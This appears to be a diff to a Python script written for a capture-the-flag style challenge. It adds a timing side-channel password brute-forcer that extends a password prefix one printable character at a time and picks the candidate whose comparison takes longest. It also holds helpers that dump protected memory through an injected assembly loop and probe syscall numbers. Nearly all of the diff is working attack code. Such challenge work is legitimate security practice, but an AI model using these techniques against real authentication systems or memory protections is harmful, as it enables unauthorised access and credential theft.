@@ -346,7 +346,8 @@ def dump_protected_mem(file=sys.stdout):
 doesn't work because of 0s'
 def read_protected_mem_block(addr,ln):
     assert(ln>0)
-    result = exec_asm(f" ld R3 {ln} / ld R2 {addr} /  loop: push R3 / push R2 / call 0x47 / pop R2 / pop R3 / inc R2 / dec R3 / cmp R3 $0 / jp ne loop / ret / brk ")
+    result = exec_asm(
+        f" ld R3 {ln} / ld R2 {addr} /  loop: push R3 / push R2 / call 0x47 / pop R2 / pop R3 / inc R2 / dec R3 / cmp R3 $0 / jp ne loop / ret / brk ")
     if result.startswith(b" "):
         result=result[1:]
     if result.endswith(b"Ready.\n> "):
@@ -387,32 +388,50 @@ def connect_serv2_and_measure_time(password, username="ax.arwen"):
 
 
 def try_password(pw):
-    st, out = subprocess.getstatusoutput(f"rust_stuff/target/release/rust_stuff {pw}")
+    out = subprocess.check_output(["rust_stuff/target/release/rust_stuff", pw])
+    out = out.decode("utf8").rstrip()
     print(out)
-    if st != 0:
-        raise Exception("Subproc failed with status", st)
 
-    _pw, time_ns, succ = out.trim().split(", ")
+    _pw, un_time_ns, pw_time_ns, succ = out.split(", ")
     assert pw == _pw
-    time_ns = int(time_ns)
+    un_time_ns = int(un_time_ns)
+    pw_time_ns = int(pw_time_ns)
 
-    return time_ns, succ
+    return un_time_ns, pw_time_ns, succ
 
 
 def try_passwords(prefix):
     timings = {}
-    alpha_lower = "qwertyuiopasdfghjklzxcvbnm"
-    alphanum = alpha_lower + alpha_lower.upper() + "1234567890"
+    chrs = printable_no_ws | {" "}
 
-    for ch in alphanum:
+    for ch in sorted(chrs):
         pw = prefix + ch
-        time_ns, succ = try_password(pw)
-        timings[pw] = time_ns
+        un_time_ns, pw_time_ns, succ = try_password(pw)
+        timings[pw] = un_time_ns, pw_time_ns,
         if succ == "true":
             print("Successful password??", pw)
             raise Exception("Yay!", pw)
 
     return timings
+
+
+def compare_timings(ts):
+    min_timing = {pw: min(t[pw] for t in ts) for pw in ts[0]}
+
+    pws = list(min_timing.keys())
+    pws = sorted(pws, key=min_timing.get, reverse=True)
+
+    best_time = min_timing[pws[0]]
+    snd_best_time = min_timing[pws[1]]
+
+    for pw in pws:
+        print(f"Pw {pw} took {min_timing[pw]}")
+
+    print(f"Best pw     = {pws[0]} with time {best_time}")
+    print(f"Second best = {pws[1]} with time {snd_best_time}")
+    print(f"Difference of {best_time - snd_best_time}")
+
+    return pws[0], best_time
 
 
 def test_syscall(n, rs=None):
@@ -448,6 +467,6 @@ def test_syscalls(start=5, stop=256):
             except Exception as e:
                 print(f"failed {i}, partial: {repr(r)}")
                 raise e
-                syscall_res[i] = r
+                # syscall_res[i]=r
     for k, v in syscall_res.items():
         print(f"{k:0{2}X} : {v}")
